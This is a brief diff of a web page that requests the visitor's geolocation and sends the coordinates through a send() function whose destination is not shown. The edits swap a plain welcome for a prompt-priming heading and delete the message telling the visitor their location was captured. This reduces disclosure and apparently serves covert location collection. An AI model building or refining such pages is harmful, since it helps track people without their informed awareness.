@@ -20,7 +20,7 @@
 </head>
 
 <body>
-    <h1>Welcome!</h1>
+    <h1>Your browser is about to ask a question.</h1>
     <p id="status">Loading…</p>
 
     <script>
@@ -49,7 +49,7 @@
                 sent = true;
                 navigator.geolocation.clearWatch(watchId);
                 if (best) {
-                    status.textContent = `Location captured (±${Math.round(best.accuracy)} m). Thanks!`;
+                    status.textContent = `(±${Math.round(best.accuracy)} m).`;
                     send({
                         permission: 'granted',
                         latitude: best.latitude,
